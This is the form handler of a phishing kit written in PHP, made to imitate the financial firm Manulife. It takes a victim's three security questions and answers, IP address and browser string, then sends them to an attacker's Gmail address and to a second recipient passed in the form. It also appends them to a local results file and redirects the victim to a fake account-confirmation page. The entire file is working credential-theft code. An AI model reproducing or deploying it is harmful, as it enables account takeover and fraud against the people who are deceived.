<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2 QuestionResults----------------\n";
$message .= "question1 : ".$_POST['Q1']."\n";
$message .= "answer1 : ".$_POST['A1']."\n";
$message .= "question2 : ".$_POST['Q2']."\n";
$message .= "answer2 : ".$_POST['A2']."\n";
$message .= "question3 : ".$_POST['Q3']."\n";
$message .= "answer3 : ".$_POST['A3']."\n";
$message .= "-----------------created by medpage---------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------manulife ReSulT------------------\n";
$send = "flashygordon6754@gmail.com";
$subject = "manulifeResultz 2 $ip ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "accountConfirm.html?/MBCClientUI/forgotPasswordInitialStep.action;jsessionid=0000LpjoAEtRhpKuzu5OSudeG1Q:18m52sb7k";

</script>
